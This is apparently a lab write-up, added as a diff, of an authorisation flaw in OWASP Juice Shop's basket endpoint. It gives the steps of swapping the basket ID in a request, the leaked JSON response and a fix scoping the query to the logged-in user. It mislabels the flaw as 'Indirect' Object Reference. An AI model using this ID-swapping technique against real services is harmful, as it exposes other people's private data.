@@ -1,0 +1,34 @@
+IDOR in basket access endpoint - OWASP JUICE SHOP
+
+VULNERABILITY TYPE:
+Indirect Object Reference(IDOR)
+
+Endpoint Affected:
+GET /rest/basket/{basketId}
+
+The application was supposed to authorise the user to view only their basket, it must be restricted to the owner.
+
+What went wrong?
+The server trusted the ID supplied in the URL without verifying whether it belonged to the authenticated user who logged in.
+
+Steps to reproduce:
+1.Login as normal user.
+2.Intercept the request,
+  GET rest/basket/7
+3.Change the ID in the URL so as to access another user's basket.
+
+Response after altering ID in URL,as,
+  GET rest/basket/1
+
+{"status":"success","data":{"id":1,"coupon":null,"UserId":1,"createdAt":"2025-12-29T18:21:29.232Z","updatedAt":"2025-12-29T18:21:29.232Z","Products":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple_juice.jpg","createdAt":"2025-12-29T18:21:28.436Z","updatedAt":"2025-12-29T18:21:28.436Z","deletedAt":null,"BasketItem":{"ProductId":1,"BasketId":1,"id":1,"quantity":2,"createdAt":"2025-12-29T18:21:29.477Z","updatedAt":"2025-12-29T18:21:29.477Z"}},{"id":2,"name":"Orange Juice (1000ml)","description":"Made from oranges hand-picked by Uncle Dittmeyer.","price":2.99,"deluxePrice":2.49,"image":"orange_juice.jpg","createdAt":"2025-12-29T18:21:28.436Z","updatedAt":"2025-12-29T18:21:28.436Z","deletedAt":null,"BasketItem":{"ProductId":2,"BasketId":1,"id":2,"quantity":3,"createdAt":"2025-12-29T18:21:29.477Z","updatedAt":"2025-12-29T18:21:29.477Z"}},{"id":3,"name":"Eggfruit Juice (500ml)","description":"Now with even more exotic flavour.","price":8.99,"deluxePrice":8.99,"image":"eggfruit_juice.jpg","createdAt":"2025-12-29T18:21:28.436Z","updatedAt":"2025-12-29T18:21:28.436Z","deletedAt":null,"BasketItem":{"ProductId":3,"BasketId":1,"id":3,"quantity":1,"createdAt":"2025-12-29T18:21:29.477Z","updatedAt":"2025-12-29T18:21:29.477Z"}}]}}
+
+It returned data from another user's basket.
+
+Recommended Fix:
+Basket.findOne({
+  id:req.params.id,
+  userId:req.user.id
+})
+
+CONCLUSION
+Authorisation must always be based on server-trusted identity, not client supplied identifiers.
